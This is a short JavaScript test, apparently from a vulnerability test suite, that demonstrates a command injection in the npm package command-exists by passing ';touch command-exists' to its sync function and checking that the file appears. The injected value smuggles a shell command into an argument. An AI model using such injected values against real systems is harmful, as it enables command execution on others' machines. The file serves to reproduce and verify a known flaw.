//https://hackerone.com/reports/324453
test("Command Injection in command-exists", () => {
  const commandExists = require("command-exists");
  const fs = require("fs");
  const path = "./command-exists";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  commandExists.sync(";touch command-exists");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
